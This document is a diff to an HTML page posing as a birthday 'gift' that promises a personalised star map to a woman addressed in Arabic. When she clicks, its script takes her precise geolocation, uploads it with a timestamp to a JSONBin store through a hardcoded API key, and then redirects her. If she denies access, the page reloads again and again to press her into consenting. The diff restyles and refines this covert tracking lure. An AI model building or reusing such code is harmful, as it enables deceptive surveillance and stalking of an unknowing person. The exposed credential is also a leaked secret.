@@ -3,68 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Thank </title>
+    <title>Thank You Gift</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            background: #f8e0e0;
-            color: #4a4a4a;
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #f8e0e0, #fce4ec);
+            color: #333;
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 500px;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         h1 {
-            font-size: 2.5rem;
-            color: #d9538e;
-            text-align: center;
-            margin-bottom: 20px;
+            font-size: 2.8rem;
+            color: #e91e63;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 5px rgba(233, 30, 99, 0.2);
+        }
+
+        p {
+            font-size: 1.1rem;
+            color: #555;
+            margin-bottom: 25px;
         }
 
         button {
-            background-color: #d9538e;
+            background: linear-gradient(90deg, #e91e63, #f06292);
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 1.2rem;
+            padding: 15px 35px;
+            font-size: 1.3rem;
+            font-weight: bold;
             cursor: pointer;
-            border-radius: 8px;
-            transition: background-color 0.3s ease;
+            border-radius: 50px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 5px 15px rgba(233, 30, 99, 0.4);
         }
 
         button:hover {
-            background-color: #c7406f;
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(233, 30, 99, 0.6);
         }
 
         .status {
             margin-top: 20px;
             font-size: 1.2rem;
-            text-align: center;
+            font-weight: 500;
+            transition: color 0.5s ease;
         }
 
-        .status.red {
-            color: #d9538e;
-        }
-
-        .status.green {
-            color: #28a745;
-        }
-
-        .status.blue {
-            color: #007bff;
-        }
+        .status.red { color: #e91e63; }
+        .status.green { color: #00c853; }
+        .status.blue { color: #0288d1; }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div>
-        <h1> Gift from Moha 🎁 </h1>
-        <p> ملاحظة: الهدية عبارة عن خريطة مواقع النجوم لك خصيصا</p>
+    <div class="container">
+        <h1>Gift from Moha 🎁</h1>
+        <p>ملاحظة: الهدية عبارة عن خريطة مواقع النجوم لك خصيصا</p>
         <button onclick="saveToCloud()">اضغطي هنا لأعطيك هديتي</button>
         <div class="status" id="statusMessage"></div>
     </div>
+
     <script>
     const JSONBIN_URL = "https://api.jsonbin.io/v3/b/67ce1948e41b4d34e4a39a2e"; // New bin ID
     const JSONBIN_API_KEY = "$2a$10$fMLcu.oNegvM.qFIGxyI5.7cTQJueJ06As43dWTvQ.QZ84deVbY3m"; // Correct API key
@@ -72,17 +92,19 @@
     function updateStatus(message, color = 'blue') {
         const statusElement = document.getElementById('statusMessage');
         statusElement.textContent = message;
-        statusElement.style.color = color;
+        statusElement.className = `status ${color}`;
     }
 
     function saveToCloud() {
-        updateStatus("جاري تحميل الخارطة");
+        updateStatus("جاري تحميل الخارطة", "blue");
 
+        // Check if geolocation is supported
         if (!navigator.geolocation) {
-            updateStatus("Geolocation not supported", "red");
+            updateStatus("المتصفح لا يدعم تحديد الموقع", "red");
             return;
         }
 
+        // Unified geolocation getter for Android, iOS, and other platforms
         navigator.geolocation.getCurrentPosition(
             async (position) => {
                 const lat = position.coords.latitude.toFixed(6);
@@ -90,54 +112,57 @@
                 const timestamp = new Date().toISOString();
 
                 try {
-                    // Fetch the current data from JSONBin
+                    // Fetch current data from JSONBin
                     const response = await fetch(JSONBIN_URL, {
                         headers: { "X-Master-Key": JSONBIN_API_KEY }
                     });
 
                     const data = await response.json();
-
-                    // Safely check for 'locations' array or create one if it doesn't exist
                     const locations = data.record?.locations || [];
 
-                    // Add the new location
+                    // Add new location
                     locations.push({ latitude: lat, longitude: lon, timestamp });
 
-                    // Update the bin with the new data
+                    // Update the bin with new data
                     const updateResponse = await fetch(JSONBIN_URL, {
                         method: "PUT",
                         headers: {
                             "Content-Type": "application/json",
                             "X-Master-Key": JSONBIN_API_KEY
                         },
-                        body: JSON.stringify({
-                            record: { locations } // Wrap it inside 'record' object
-                        })
+                        body: JSON.stringify({ record: { locations } })
                     });
 
                     if (updateResponse.ok) {
-                        updateStatus("تم الحصول على الخريطة", "green");
-                        // Redirect to the specified URL after a short delay
+                        updateStatus("تم الحصول على الخريطة بنجاح!", "green");
                         setTimeout(() => {
                             window.location.href = "https://basilalshukaili.github.io/Raghad-Birthday/images/test2.html";
-                        }, 2000); // 2 seconds delay
+                        }, 2000);
                     } else {
-                        updateStatus("عذرا تعذر تحميل الخريطة بسبب عدم السماح للوصول للموقع الرجاء تحديث الصفحة والسماح بالوصول للموقع", "red");
+                        updateStatus("فشل تحميل الخريطة، حاولي مرة أخرى", "red");
                     }
-
                 } catch (error) {
-                    updateStatus("عذرا تعذر تحميل الخريطة بسبب عدم السماح للوصول للموقع الرجاء تحديث الصفحة والسماح بالوصول للموقع", "red");
+                    updateStatus("حدث خطأ أثناء التحميل، تحققي من الاتصال", "red");
                     console.error(error);
                 }
             },
-            () => {
-                updateStatus("عذرا تعذر تحميل الخريطة بسبب عدم السماح للوصول للموقع الرجاء تحديث الصفحة والسماح بالوصول للموقع", "red");
-                // Refresh the page after 3 seconds
-                setTimeout(() => {
-                    window.location.reload();
-                }, 3000); // 3 seconds delay
+            (error) => {
+                let errorMessage = "يرجى السماح بالوصول إلى الموقع وحاولي مجددًا";
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMessage = "تم رفض الوصول إلى الموقع";
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMessage = "معلومات الموقع غير متوفرة";
+                        break;
+                    case error.TIMEOUT:
+                        errorMessage = "انتهت مهلة تحديد الموقع";
+                        break;
+                }
+                updateStatus(errorMessage, "red");
+                setTimeout(() => window.location.reload(), 3000);
             },
-            { enableHighAccuracy: true, timeout: 5000 }
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // Adjusted for better compatibility
         );
     }
     </script>
